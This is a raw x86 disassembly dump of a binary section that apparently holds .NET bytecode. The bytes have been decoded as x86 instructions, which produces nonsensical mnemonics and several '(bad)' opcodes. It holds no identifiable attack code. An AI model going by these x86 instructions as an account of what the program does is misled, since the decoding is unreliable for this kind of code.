  404dc1:	06                   	push   %es
  404dc2:	13 05 11 05 0c de    	adc    0xde0c0511,%eax
  404dc8:	78 11                	js     0x404ddb
  404dca:	05 16 91 18 3b       	add    $0x3b189116,%eax
  404dcf:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404dd0:	fe                   	(bad)
  404dd1:	ff                   	(bad)
  404dd2:	ff 07                	incl   (%edi)
  404dd4:	11 05 28 46 00 00    	adc    %eax,0x4628
  404dda:	06                   	push   %es
  404ddb:	13 06                	adc    (%esi),%eax
  404ddd:	11 06                	adc    %eax,(%esi)
  404ddf:	2d 04 14 0c de       	sub    $0xde0c1404,%eax
  404de4:	5c                   	pop    %esp
  404de5:	07                   	pop    %es
  404de6:	11 05 11 06 7b 6e    	adc    %eax,0x6e7b0611
  404dec:	00 00                	add    %al,(%eax)
  404dee:	04 28                	add    $0x28,%al
  404df0:	47                   	inc    %edi
  404df1:	00 00                	add    %al,(%eax)
  404df3:	06                   	push   %es
  404df4:	13 05 11 06 7b 6c    	adc    0x6c7b0611,%eax
  404dfa:	00 00                	add    %al,(%eax)
  404dfc:	04 2c                	add    $0x2c,%al
  404dfe:	10 11                	adc    %dl,(%ecx)
  404e00:	05 11 06 7b 6d       	add    $0x6d7b0611,%eax
  404e05:	00 00                	add    %al,(%eax)
  404e07:	04 28                	add    $0x28,%al
  404e09:	07                   	pop    %es
  404e0a:	00 00                	add    %al,(%eax)
  404e0c:	06                   	push   %es
  404e0d:	13 05 11 05 07 7b    	adc    0x7b070511,%eax
  404e13:	70 00                	jo     0x404e15
  404e15:	00 04 28             	add    %al,(%eax,%ebp,1)
  404e18:	0f 00 00             	sldt   (%eax)
  404e1b:	06                   	push   %es
  404e1c:	13 05 11 05 0c de    	adc    0xde0c0511,%eax
  404e22:	1e                   	push   %ds
  404e23:	26 14 0c             	es adc $0xc,%al
  404e26:	de 19                	ficomps (%ecx)
  404e28:	13 08                	adc    (%eax),%ecx
  404e2a:	02 1f                	add    (%edi),%bl
  404e2c:	fe                   	(bad)
  404e2d:	7d 74                	jge    0x404ea3
  404e2f:	00 00                	add    %al,(%eax)
  404e31:	04 02                	add    $0x2,%al
  404e33:	7c 75                	jl     0x404eaa
  404e35:	00 00                	add    %al,(%eax)
  404e37:	04 11                	add    $0x11,%al
  404e39:	08 28                	or     %ch,(%eax)
  404e3b:	99                   	cltd
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	0a de                	or     %dh,%bl
  404e40:	14 02                	adc    $0x2,%al
  404e42:	1f                   	pop    %ds
  404e43:	fe                   	(bad)
  404e44:	7d 74                	jge    0x404eba
  404e46:	00 00                	add    %al,(%eax)
  404e48:	04 02                	add    $0x2,%al
  404e4a:	7c 75                	jl     0x404ec1
  404e4c:	00 00                	add    %al,(%eax)
  404e4e:	04 08                	add    $0x8,%al
  404e50:	28 9a 00 00 0a 2a    	sub    %bl,0x2a0a0000(%edx)
  404e56:	00 00                	add    %al,(%eax)
  404e58:	41                   	inc    %ecx
  404e59:	34 00                	xor    $0x0,%al
  404e5b:	00 00                	add    %al,(%eax)
  404e5d:	00 00                	add    %al,(%eax)
  404e5f:	00 13                	add    %dl,(%ebx)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 b4 01 00 00 c7 01 	add    %dh,0x1c70000(%ecx,%eax,1)
  404e6a:	00 00                	add    %al,(%eax)
  404e6c:	05 00 00 00 01       	add    $0x1000000,%eax
  404e71:	00 00                	add    %al,(%eax)
  404e73:	01 00                	add    %eax,(%eax)
  404e75:	00 00                	add    %al,(%eax)
  404e77:	00 0e                	add    %cl,(%esi)
  404e79:	00 00                	add    %al,(%eax)
  404e7b:	00 be 01 00 00 cc    	add    %bh,-0x33ffffff(%esi)
  404e81:	01 00                	add    %eax,(%eax)
  404e83:	00 19                	add    %bl,(%ecx)
  404e85:	00 00                	add    %al,(%eax)
  404e87:	00 0b                	add    %cl,(%ebx)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	01 1b                	add    %ebx,(%ebx)
  404e8d:	30 05 00 c2 02 00    	xor    %al,0x2c200
  404e93:	00 27                	add    %ah,(%edi)
  404e95:	00 00                	add    %al,(%eax)
  404e97:	11 02                	adc    %eax,(%edx)
  404e99:	7b 78                	jnp    0x404f13
  404e9b:	00 00                	add    %al,(%eax)
  404e9d:	04 0a                	add    $0xa,%al
  404e9f:	02 7b 7b             	add    0x7b(%ebx),%bh
  404ea2:	00 00                	add    %al,(%eax)
  404ea4:	04 0b                	add    $0xb,%al
  404ea6:	06                   	push   %es
  404ea7:	45                   	inc    %ebp
  404ea8:	03 00                	add    (%eax),%eax
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	bb 00 00 00 c0       	mov    $0xc0000000,%ebx
  404eb1:	01 00                	add    %eax,(%eax)
  404eb3:	00 28                	add    %ch,(%eax)
  404eb5:	02 00                	add    (%eax),%al
  404eb7:	00 02                	add    %al,(%edx)
  404eb9:	02 7b 7a             	add    0x7a(%ebx),%bh
  404ebc:	00 00                	add    %al,(%eax)
  404ebe:	04 8d                	add    $0x8d,%al
  404ec0:	2e 00 00             	add    %al,%cs:(%eax)
  404ec3:	01 7d 7c             	add    %edi,0x7c(%ebp)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	04 02                	add    $0x2,%al
  404eca:	16                   	push   %ss
  404ecb:	7d 7d                	jge    0x404f4a
  404ecd:	00 00                	add    %al,(%eax)
  404ecf:	04 02                	add    $0x2,%al
  404ed1:	02 7b 7a             	add    0x7a(%ebx),%bh
  404ed4:	00 00                	add    %al,(%eax)
  404ed6:	04 7d                	add    $0x7d,%al
  404ed8:	7e 00                	jle    0x404eda
  404eda:	00 04 02             	add    %al,(%edx,%eax,1)
  404edd:	28 a4 00 00 0a 7d 7f 	sub    %ah,0x7f7d0a00(%eax,%eax,1)
  404ee4:	00 00                	add    %al,(%eax)
  404ee6:	04 02                	add    $0x2,%al
  404ee8:	28 a4 00 00 0a 7d 80 	sub    %ah,-0x7f82f600(%eax,%eax,1)
  404eef:	00 00                	add    %al,(%eax)
  404ef1:	04 38                	add    $0x38,%al
  404ef3:	0d 02 00 00 07       	or     $0x7000002,%eax
  404ef8:	7b 6f                	jnp    0x404f69
  404efa:	00 00                	add    %al,(%eax)
  404efc:	04 6f                	add    $0x6f,%al
  404efe:	73 00                	jae    0x404f00
  404f00:	00 0a                	add    %cl,(%edx)
  404f02:	2d 07 14 0c dd       	sub    $0xdd0c1407,%eax
  404f07:	33 02                	xor    (%edx),%eax
  404f09:	00 00                	add    %al,(%eax)
  404f0b:	07                   	pop    %es
  404f0c:	7b 6f                	jnp    0x404f7d
  404f0e:	00 00                	add    %al,(%eax)
  404f10:	04 6f                	add    $0x6f,%al
  404f12:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404f13:	00 00                	add    %al,(%eax)
  404f15:	0a 16                	or     (%esi),%dl
  404f17:	3e ac                	lods   %ds:(%esi),%al
  404f19:	00 00                	add    %al,(%eax)
  404f1b:	00 07                	add    %al,(%edi)
  404f1d:	7b 6f                	jnp    0x404f8e
  404f1f:	00 00                	add    %al,(%eax)
  404f21:	04 02                	add    $0x2,%al
  404f23:	7b 7c                	jnp    0x404fa1
  404f25:	00 00                	add    %al,(%eax)
  404f27:	04 02                	add    $0x2,%al
  404f29:	7b 7d                	jnp    0x404fa8
  404f2b:	00 00                	add    %al,(%eax)
  404f2d:	04 02                	add    $0x2,%al
  404f2f:	7b 7e                	jnp    0x404faf
  404f31:	00 00                	add    %al,(%eax)
  404f33:	04 73                	add    $0x73,%al
  404f35:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404f36:	00 00                	add    %al,(%eax)
  404f38:	0a 16                	or     (%esi),%dl
  404f3a:	28 a7 00 00 0a 6f    	sub    %ah,0x6f0a0000(%edi)
  404f40:	a8 00                	test   $0x0,%al
  404f42:	00 0a                	add    %cl,(%edx)
  404f44:	13 04 12             	adc    (%edx,%edx,1),%eax
  404f47:	04 28                	add    $0x28,%al
  404f49:	a9 00 00 0a 2d       	test   $0x2d0a0000,%eax
  404f4e:	41                   	inc    %ecx
  404f4f:	02 16                	add    (%esi),%dl
  404f51:	25 0a 7d 78 00       	and    $0x787d0a,%eax
  404f56:	00 04 02             	add    %al,(%edx,%eax,1)
  404f59:	11 04 7d 81 00 00 04 	adc    %eax,0x4000081(,%edi,2)
  404f60:	02 7c 79 00          	add    0x0(%ecx,%edi,2),%bh
  404f64:	00 04 12             	add    %al,(%edx,%edx,1)
  404f67:	04 02                	add    $0x2,%al
  404f69:	28 35 00 00 2b dd    	sub    %dh,0xdd2b0000
  404f6f:	e6 01                	out    %al,$0x1
  404f71:	00 00                	add    %al,(%eax)
  404f73:	02 7b 81             	add    -0x7f(%ebx),%bh
  404f76:	00 00                	add    %al,(%eax)
  404f78:	04 13                	add    $0x13,%al
  404f7a:	04 02                	add    $0x2,%al
  404f7c:	7c 81                	jl     0x404eff
  404f7e:	00 00                	add    %al,(%eax)
  404f80:	04 fe                	add    $0xfe,%al
  404f82:	15 18 00 00 1b       	adc    $0x1b000018,%eax
  404f87:	02 15 25 0a 7d 78    	add    0x787d0a25,%dl
  404f8d:	00 00                	add    %al,(%eax)
  404f8f:	04 12                	add    $0x12,%al
  404f91:	04 28                	add    $0x28,%al
  404f93:	aa                   	stos   %al,%es:(%edi)
  404f94:	00 00                	add    %al,(%eax)
  404f96:	0a 0d 09 2d 0c 02    	or     0x20c2d09,%cl
  404f9c:	14 7d                	adc    $0x7d,%al
  404f9e:	7c 00                	jl     0x404fa0
  404fa0:	00 04 38             	add    %al,(%eax,%edi,1)
  404fa3:	6e                   	outsb  %ds:(%esi),(%dx)
  404fa4:	01 00                	add    %eax,(%eax)
  404fa6:	00 02                	add    %al,(%edx)
  404fa8:	02 7b 7d             	add    0x7d(%ebx),%bh
  404fab:	00 00                	add    %al,(%eax)
  404fad:	04 09                	add    $0x9,%al
  404faf:	58                   	pop    %eax
  404fb0:	7d 7d                	jge    0x40502f
  404fb2:	00 00                	add    %al,(%eax)
  404fb4:	04 02                	add    $0x2,%al
  404fb6:	02 7b 7e             	add    0x7e(%ebx),%bh
  404fb9:	00 00                	add    %al,(%eax)
  404fbb:	04 09                	add    $0x9,%al
  404fbd:	59                   	pop    %ecx
  404fbe:	7d 7e                	jge    0x40503e
  404fc0:	00 00                	add    %al,(%eax)
  404fc2:	04 38                	add    $0x38,%al
  404fc4:	3c 01                	cmp    $0x1,%al
  404fc6:	00 00                	add    %al,(%eax)
  404fc8:	07                   	pop    %es
  404fc9:	7b 71                	jnp    0x40503c
  404fcb:	00 00                	add    %al,(%eax)
  404fcd:	04 2c                	add    $0x2c,%al
  404fcf:	2e 28 a4 00 00 0a 02 	sub    %ah,%cs:0x7b020a00(%eax,%eax,1)
  404fd6:	7b 
  404fd7:	7f 00                	jg     0x404fd9
  404fd9:	00 04 28             	add    %al,(%eax,%ebp,1)
  404fdc:	ab                   	stos   %eax,%es:(%edi)
  404fdd:	00 00                	add    %al,(%eax)
  404fdf:	0a 13                	or     (%ebx),%dl
  404fe1:	06                   	push   %es
  404fe2:	12 06                	adc    (%esi),%al
  404fe4:	28 ac 00 00 0a 07 7b 	sub    %ch,0x7b070a00(%eax,%eax,1)
  404feb:	71 00                	jno    0x404fed
  404fed:	00 04 6c             	add    %al,(%esp,%ebp,2)
  404ff0:	37                   	aaa
  404ff1:	0c 02                	or     $0x2,%al
  404ff3:	14 7d                	adc    $0x7d,%al
  404ff5:	7c 00                	jl     0x404ff7
  404ff7:	00 04 38             	add    %al,(%eax,%edi,1)
  404ffa:	17                   	pop    %ss
  404ffb:	01 00                	add    %eax,(%eax)
  404ffd:	00 28                	add    %ch,(%eax)
  404fff:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405000:	00 00                	add    %al,(%eax)
  405002:	0a 02                	or     (%edx),%al
  405004:	7b 80                	jnp    0x404f86
  405006:	00 00                	add    %al,(%eax)
  405008:	04 28                	add    $0x28,%al
  40500a:	ab                   	stos   %eax,%es:(%edi)
  40500b:	00 00                	add    %al,(%eax)
  40500d:	0a 13                	or     (%ebx),%dl
  40500f:	05 12 05 28 ac       	add    $0xac280512,%eax
  405014:	00 00                	add    %al,(%eax)
  405016:	0a 23                	or     (%ebx),%ah
  405018:	00 00                	add    %al,(%eax)
  40501a:	00 00                	add    %al,(%eax)
  40501c:	00 70 97             	add    %dh,-0x69(%eax)
  40501f:	40                   	inc    %eax
  405020:	44                   	inc    %esp
  405021:	83 00 00             	addl   $0x0,(%eax)
  405024:	00 07                	add    %al,(%edi)
  405026:	7b 6f                	jnp    0x405097
  405028:	00 00                	add    %al,(%eax)
  40502a:	04 1b                	add    $0x1b,%al
  40502c:	8d 2e                	lea    (%esi),%ebp
  40502e:	00 00                	add    %al,(%eax)
  405030:	01 25 16 17 9c 25    	add    %esp,0x259c1716
  405036:	1a 18                	sbb    (%eax),%bl
  405038:	9c                   	pushf
  405039:	73 ad                	jae    0x404fe8
  40503b:	00 00                	add    %al,(%eax)
  40503d:	0a 16                	or     (%esi),%dl
  40503f:	28 ae 00 00 0a 6f    	sub    %ch,0x6f0a0000(%esi)
  405045:	a8 00                	test   $0x0,%al
  405047:	00 0a                	add    %cl,(%edx)
  405049:	13 04 12             	adc    (%edx,%edx,1),%eax
  40504c:	04 28                	add    $0x28,%al
  40504e:	a9 00 00 0a 2d       	test   $0x2d0a0000,%eax
  405053:	41                   	inc    %ecx
  405054:	02 17                	add    (%edi),%dl
  405056:	25 0a 7d 78 00       	and    $0x787d0a,%eax
  40505b:	00 04 02             	add    %al,(%edx,%eax,1)
  40505e:	11 04 7d 81 00 00 04 	adc    %eax,0x4000081(,%edi,2)
  405065:	02 7c 79 00          	add    0x0(%ecx,%edi,2),%bh
  405069:	00 04 12             	add    %al,(%edx,%edx,1)
  40506c:	04 02                	add    $0x2,%al
  40506e:	28 35 00 00 2b dd    	sub    %dh,0xdd2b0000
  405074:	e1 00                	loope  0x405076
  405076:	00 00                	add    %al,(%eax)
  405078:	02 7b 81             	add    -0x7f(%ebx),%bh
  40507b:	00 00                	add    %al,(%eax)
  40507d:	04 13                	add    $0x13,%al
  40507f:	04 02                	add    $0x2,%al
  405081:	7c 81                	jl     0x405004
  405083:	00 00                	add    %al,(%eax)
  405085:	04 fe                	add    $0xfe,%al
  405087:	15 18 00 00 1b       	adc    $0x1b000018,%eax
  40508c:	02 15 25 0a 7d 78    	add    0x787d0a25,%dl
  405092:	00 00                	add    %al,(%eax)
  405094:	04 12                	add    $0x12,%al
  405096:	04 28                	add    $0x28,%al
  405098:	aa                   	stos   %al,%es:(%edi)
  405099:	00 00                	add    %al,(%eax)
  40509b:	0a 26                	or     (%esi),%ah
  40509d:	02 28                	add    (%eax),%ch
  40509f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4050a0:	00 00                	add    %al,(%eax)
  4050a2:	0a 7d 80             	or     -0x80(%ebp),%bh
  4050a5:	00 00                	add    %al,(%eax)
  4050a7:	04 1f                	add    $0x1f,%al
  4050a9:	0a 28                	or     (%eax),%ch
  4050ab:	6b 00 00             	imul   $0x0,(%eax),%eax
  4050ae:	0a 6f 37             	or     0x37(%edi),%ch
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	0a 13                	or     (%ebx),%dl
  4050b5:	07                   	pop    %es
  4050b6:	12 07                	adc    (%edi),%al
  4050b8:	28 38                	sub    %bh,(%eax)
  4050ba:	00 00                	add    %al,(%eax)
  4050bc:	0a 2d 3e 02 18 25    	or     0x2518023e,%ch
  4050c2:	0a 7d 78             	or     0x78(%ebp),%bh
  4050c5:	00 00                	add    %al,(%eax)
  4050c7:	04 02                	add    $0x2,%al
  4050c9:	11 07                	adc    %eax,(%edi)
  4050cb:	7d 82                	jge    0x40504f
  4050cd:	00 00                	add    %al,(%eax)
  4050cf:	04 02                	add    $0x2,%al
  4050d1:	7c 79                	jl     0x40514c
  4050d3:	00 00                	add    %al,(%eax)
  4050d5:	04 12                	add    $0x12,%al
  4050d7:	07                   	pop    %es
  4050d8:	02 28                	add    (%eax),%ch
  4050da:	36 00 00             	add    %al,%ss:(%eax)
  4050dd:	2b de                	sub    %esi,%ebx
  4050df:	79 02                	jns    0x4050e3
  4050e1:	7b 82                	jnp    0x405065
  4050e3:	00 00                	add    %al,(%eax)
  4050e5:	04 13                	add    $0x13,%al
  4050e7:	07                   	pop    %es
  4050e8:	02 7c 82 00          	add    0x0(%edx,%eax,4),%bh
  4050ec:	00 04 fe             	add    %al,(%esi,%edi,8)
  4050ef:	15 0a 00 00 01       	adc    $0x100000a,%eax
  4050f4:	02 15 25 0a 7d 78    	add    0x787d0a25,%dl
  4050fa:	00 00                	add    %al,(%eax)
  4050fc:	04 12                	add    $0x12,%al
  4050fe:	07                   	pop    %es
  4050ff:	28 39                	sub    %bh,(%ecx)
  405101:	00 00                	add    %al,(%eax)
  405103:	0a 02                	or     (%edx),%al
  405105:	7b 7d                	jnp    0x405184
  405107:	00 00                	add    %al,(%eax)
  405109:	04 02                	add    $0x2,%al
  40510b:	7b 7a                	jnp    0x405187
  40510d:	00 00                	add    %al,(%eax)
  40510f:	04 3f                	add    $0x3f,%al
  405111:	e2 fd                	loop   0x405110
  405113:	ff                   	(bad)
  405114:	ff 02                	incl   (%edx)
  405116:	7b 7c                	jnp    0x405194
  405118:	00 00                	add    %al,(%eax)
  40511a:	04 0c                	add    $0xc,%al
  40511c:	de 20                	fisubs (%eax)
  40511e:	13 08                	adc    (%eax),%ecx
  405120:	02 1f                	add    (%edi),%bl
  405122:	fe                   	(bad)
  405123:	7d 78                	jge    0x40519d
  405125:	00 00                	add    %al,(%eax)
  405127:	04 02                	add    $0x2,%al
  405129:	14 7d                	adc    $0x7d,%al
  40512b:	7c 00                	jl     0x40512d
  40512d:	00 04 02             	add    %al,(%edx,%eax,1)
  405130:	7c 79                	jl     0x4051ab
  405132:	00 00                	add    %al,(%eax)
  405134:	04 11                	add    $0x11,%al
  405136:	08 28                	or     %ch,(%eax)
  405138:	99                   	cltd
  405139:	00 00                	add    %al,(%eax)
  40513b:	0a de                	or     %dh,%bl
  40513d:	1b 02                	sbb    (%edx),%eax
  40513f:	1f                   	pop    %ds
  405140:	fe                   	(bad)
  405141:	7d 78                	jge    0x4051bb
  405143:	00 00                	add    %al,(%eax)
  405145:	04 02                	add    $0x2,%al
  405147:	14 7d                	adc    $0x7d,%al
  405149:	7c 00                	jl     0x40514b
  40514b:	00 04 02             	add    %al,(%edx,%eax,1)
  40514e:	7c 79                	jl     0x4051c9
  405150:	00 00                	add    %al,(%eax)
  405152:	04 08                	add    $0x8,%al
  405154:	28 9a 00 00 0a 2a    	sub    %bl,0x2a0a0000(%edx)
  40515a:	00 00                	add    %al,(%eax)
  40515c:	41                   	inc    %ecx
  40515d:	1c 00                	sbb    $0x0,%al
  40515f:	00 00                	add    %al,(%eax)
  405161:	00 00                	add    %al,(%eax)
  405163:	00 0e                	add    %cl,(%esi)
  405165:	00 00                	add    %al,(%eax)
  405167:	00 78 02             	add    %bh,0x2(%eax)
  40516a:	00 00                	add    %al,(%eax)
  40516c:	86 02                	xchg   %al,(%edx)
  40516e:	00 00                	add    %al,(%eax)
  405170:	20 00                	and    %al,(%eax)
  405172:	00 00                	add    %al,(%eax)
  405174:	0b 00                	or     (%eax),%eax
  405176:	00 01                	add    %al,(%ecx)
  405178:	1b 30                	sbb    (%eax),%esi
  40517a:	04 00                	add    $0x0,%al
  40517c:	57                   	push   %edi
  40517d:	01 00                	add    %eax,(%eax)
  40517f:	00 28                	add    %ch,(%eax)
  405181:	00 00                	add    %al,(%eax)
  405183:	11 02                	adc    %eax,(%edx)
  405185:	7b 83                	jnp    0x40510a
  405187:	00 00                	add    %al,(%eax)
  405189:	04 0a                	add    $0xa,%al
  40518b:	02 7b 86             	add    -0x7a(%ebx),%bh
  40518e:	00 00                	add    %al,(%eax)
  405190:	04 0b                	add    $0xb,%al
  405192:	06                   	push   %es
  405193:	39 a0 00 00 00 02    	cmp    %esp,0x2000000(%eax)
  405199:	02 7b 85             	add    -0x7b(%ebx),%bh
  40519c:	00 00                	add    %al,(%eax)
  40519e:	04 8d                	add    $0x8d,%al
  4051a0:	2e 00 00             	add    %al,%cs:(%eax)
  4051a3:	01 7d 87             	add    %edi,-0x79(%ebp)
  4051a6:	00 00                	add    %al,(%eax)
  4051a8:	04 02                	add    $0x2,%al
  4051aa:	16                   	push   %ss
  4051ab:	7d 88                	jge    0x405135
  4051ad:	00 00                	add    %al,(%eax)
  4051af:	04 02                	add    $0x2,%al
  4051b1:	02 7b 85             	add    -0x7b(%ebx),%bh
  4051b4:	00 00                	add    %al,(%eax)
  4051b6:	04 7d                	add    $0x7d,%al
  4051b8:	89 00                	mov    %eax,(%eax)
  4051ba:	00 04 28             	add    %al,(%eax,%ebp,1)
  4051bd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4051be:	00 00                	add    %al,(%eax)
  4051c0:	0a 26                	or     (%esi),%ah
  4051c2:	28 a4 00 00 0a 26 38 	sub    %ah,0x38260a00(%eax,%eax,1)
  4051c9:	b8 00 00 00 07       	mov    $0x7000000,%eax
  4051ce:	7b 6f                	jnp    0x40523f
  4051d0:	00 00                	add    %al,(%eax)
  4051d2:	04 6f                	add    $0x6f,%al
  4051d4:	73 00                	jae    0x4051d6
  4051d6:	00 0a                	add    %cl,(%edx)
  4051d8:	2d 07 14 0c dd       	sub    $0xdd0c1407,%eax
  4051dd:	de 00                	fiadds (%eax)
  4051df:	00 00                	add    %al,(%eax)
  4051e1:	07                   	pop    %es
  4051e2:	7b 6f                	jnp    0x405253
  4051e4:	00 00                	add    %al,(%eax)
  4051e6:	04 02                	add    $0x2,%al
  4051e8:	7b 87                	jnp    0x405171
  4051ea:	00 00                	add    %al,(%eax)
  4051ec:	04 02                	add    $0x2,%al
  4051ee:	7b 88                	jnp    0x405178
  4051f0:	00 00                	add    %al,(%eax)
  4051f2:	04 02                	add    $0x2,%al
  4051f4:	7b 89                	jnp    0x40517f
  4051f6:	00 00                	add    %al,(%eax)
  4051f8:	04 73                	add    $0x73,%al
  4051fa:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4051fb:	00 00                	add    %al,(%eax)
  4051fd:	0a 16                	or     (%esi),%dl
  4051ff:	28 a7 00 00 0a 6f    	sub    %ah,0x6f0a0000(%edi)
  405205:	a8 00                	test   $0x0,%al
  405207:	00 0a                	add    %cl,(%edx)
  405209:	13 04 12             	adc    (%edx,%edx,1),%eax
  40520c:	04 28                	add    $0x28,%al
  40520e:	a9 00 00 0a 2d       	test   $0x2d0a0000,%eax
  405213:	41                   	inc    %ecx
  405214:	02 16                	add    (%esi),%dl
  405216:	25 0a 7d 83 00       	and    $0x837d0a,%eax
  40521b:	00 04 02             	add    %al,(%edx,%eax,1)
  40521e:	11 04 7d 8a 00 00 04 	adc    %eax,0x400008a(,%edi,2)
  405225:	02 7c 84 00          	add    0x0(%esp,%eax,4),%bh
  405229:	00 04 12             	add    %al,(%edx,%edx,1)
  40522c:	04 02                	add    $0x2,%al
  40522e:	28 37                	sub    %dh,(%edi)
  405230:	00 00                	add    %al,(%eax)
  405232:	2b dd                	sub    %ebp,%ebx
  405234:	a2 00 00 00 02       	mov    %al,0x2000000
  405239:	7b 8a                	jnp    0x4051c5
  40523b:	00 00                	add    %al,(%eax)
  40523d:	04 13                	add    $0x13,%al
  40523f:	04 02                	add    $0x2,%al
  405241:	7c 8a                	jl     0x4051cd
  405243:	00 00                	add    %al,(%eax)
  405245:	04 fe                	add    $0xfe,%al
  405247:	15 18 00 00 1b       	adc    $0x1b000018,%eax
  40524c:	02 15 25 0a 7d 83    	add    0x837d0a25,%dl
  405252:	00 00                	add    %al,(%eax)
  405254:	04 12                	add    $0x12,%al
  405256:	04 28                	add    $0x28,%al
  405258:	aa                   	stos   %al,%es:(%edi)
  405259:	00 00                	add    %al,(%eax)
  40525b:	0a 0d 09 2d 09 02    	or     0x2092d09,%cl
  405261:	14 7d                	adc    $0x7d,%al
  405263:	87 00                	xchg   %eax,(%eax)
  405265:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  405268:	2d 02 02 7b 88       	sub    $0x887b0202,%eax
  40526d:	00 00                	add    %al,(%eax)
  40526f:	04 09                	add    $0x9,%al
  405271:	58                   	pop    %eax
  405272:	7d 88                	jge    0x4051fc
  405274:	00 00                	add    %al,(%eax)
  405276:	04 02                	add    $0x2,%al
  405278:	02 7b 89             	add    -0x77(%ebx),%bh
  40527b:	00 00                	add    %al,(%eax)
  40527d:	04 09                	add    $0x9,%al
  40527f:	59                   	pop    %ecx
  405280:	7d 89                	jge    0x40520b
  405282:	00 00                	add    %al,(%eax)
  405284:	04 02                	add    $0x2,%al
  405286:	7b 88                	jnp    0x405210
  405288:	00 00                	add    %al,(%eax)
  40528a:	04 02                	add    $0x2,%al
  40528c:	7b 85                	jnp    0x405213
  40528e:	00 00                	add    %al,(%eax)
  405290:	04 3f                	add    $0x3f,%al
  405292:	37                   	aaa
  405293:	ff                   	(bad)
  405294:	ff                   	(bad)
  405295:	ff 02                	incl   (%edx)
  405297:	7b 87                	jnp    0x405220
  405299:	00 00                	add    %al,(%eax)
  40529b:	04 0c                	add    $0xc,%al
  40529d:	de 20                	fisubs (%eax)
  40529f:	13 05 02 1f fe 7d    	adc    0x7dfe1f02,%eax
  4052a5:	83 00 00             	addl   $0x0,(%eax)
  4052a8:	04 02                	add    $0x2,%al
  4052aa:	14 7d                	adc    $0x7d,%al
  4052ac:	87 00                	xchg   %eax,(%eax)
  4052ae:	00 04 02             	add    %al,(%edx,%eax,1)
  4052b1:	7c 84                	jl     0x405237
  4052b3:	00 00                	add    %al,(%eax)
  4052b5:	04 11                	add    $0x11,%al
  4052b7:	05 28 99 00 00       	add    $0x9928,%eax
  4052bc:	0a de                	or     %dh,%bl
  4052be:	1b 02                	sbb    (%edx),%eax
  4052c0:	1f                   	pop    %ds
  4052c1:	fe                   	(bad)
  4052c2:	7d 83                	jge    0x405247
  4052c4:	00 00                	add    %al,(%eax)
  4052c6:	04 02                	add    $0x2,%al
  4052c8:	14 7d                	adc    $0x7d,%al
  4052ca:	87 00                	xchg   %eax,(%eax)
  4052cc:	00 04 02             	add    %al,(%edx,%eax,1)
  4052cf:	7c 84                	jl     0x405255
  4052d1:	00 00                	add    %al,(%eax)
  4052d3:	04 08                	add    $0x8,%al
  4052d5:	28 9a 00 00 0a 2a    	sub    %bl,0x2a0a0000(%edx)
  4052db:	00 41 1c             	add    %al,0x1c(%ecx)
  4052de:	00 00                	add    %al,(%eax)
  4052e0:	00 00                	add    %al,(%eax)
  4052e2:	00 00                	add    %al,(%eax)
  4052e4:	0e                   	push   %cs
  4052e5:	00 00                	add    %al,(%eax)
  4052e7:	00 0d 01 00 00 1b    	add    %cl,0x1b000001
  4052ed:	01 00                	add    %eax,(%eax)
  4052ef:	00 20                	add    %ah,(%eax)
  4052f1:	00 00                	add    %al,(%eax)
  4052f3:	00 0b                	add    %cl,(%ebx)
  4052f5:	00 00                	add    %al,(%eax)
  4052f7:	01 1b                	add    %ebx,(%ebx)
  4052f9:	30 05 00 8c 01 00    	xor    %al,0x18c00
  4052ff:	00 29                	add    %ch,(%ecx)
  405301:	00 00                	add    %al,(%eax)
  405303:	11 02                	adc    %eax,(%edx)
  405305:	7b 8b                	jnp    0x405292
  405307:	00 00                	add    %al,(%eax)
  405309:	04 0a                	add    $0xa,%al
  40530b:	02 7b 8e             	add    -0x72(%ebx),%bh
  40530e:	00 00                	add    %al,(%eax)
  405310:	04 0b                	add    $0xb,%al
  405312:	06                   	push   %es
  405313:	2c 18                	sub    $0x18,%al
  405315:	02 7b 8d             	add    -0x73(%ebx),%bh
  405318:	00 00                	add    %al,(%eax)
  40531a:	04 2d                	add    $0x2d,%al
  40531c:	10 72 95             	adc    %dh,-0x6b(%edx)
  40531f:	00 00                	add    %al,(%eax)
  405321:	70 72                	jo     0x405395
  405323:	9f                   	lahf
  405324:	00 00                	add    %al,(%eax)
  405326:	70 73                	jo     0x40539b
  405328:	af                   	scas   %es:(%edi),%eax
  405329:	00 00                	add    %al,(%eax)
  40532b:	0a 7a 00             	or     0x0(%edx),%bh
  40532e:	06                   	push   %es
  40532f:	39 00                	cmp    %eax,(%eax)
  405331:	01 00                	add    %eax,(%eax)
  405333:	00 02                	add    %al,(%edx)
  405335:	7b 8d                	jnp    0x4052c4
  405337:	00 00                	add    %al,(%eax)
  405339:	04 28                	add    $0x28,%al
  40533b:	06                   	push   %es
  40533c:	00 00                	add    %al,(%eax)
  40533e:	06                   	push   %es
  40533f:	0d 16 13 04 02       	or     $0x2041316,%eax
  405344:	7b 8d                	jnp    0x4052d3
  405346:	00 00                	add    %al,(%eax)
  405348:	04 8e                	add    $0x8e,%al
  40534a:	69 13 05 09 2c 11    	imul   $0x112c0905,(%ebx),%edx
  405350:	09 8e 69 11 05 2f    	or     %ecx,0x2f051169(%esi)
  405356:	0a 02                	or     (%edx),%al
  405358:	09 7d 8d             	or     %edi,-0x73(%ebp)
  40535b:	00 00                	add    %al,(%eax)
  40535d:	04 17                	add    $0x17,%al
  40535f:	13 04 17             	adc    (%edi,%edx,1),%eax
  405362:	8d 2e                	lea    (%esi),%ebp
  405364:	00 00                	add    %al,(%eax)
  405366:	01 25 16 11 04 9c    	add    %esp,0x9c041116
  40536c:	13 06                	adc    (%esi),%eax
  40536e:	11 04 17             	adc    %eax,(%edi,%edx,1)
  405371:	33 11                	xor    (%ecx),%edx
  405373:	11 06                	adc    %eax,(%esi)
  405375:	07                   	pop    %es
  405376:	11 05 28 4b 00 00    	adc    %eax,0x4b28
  40537c:	06                   	push   %es
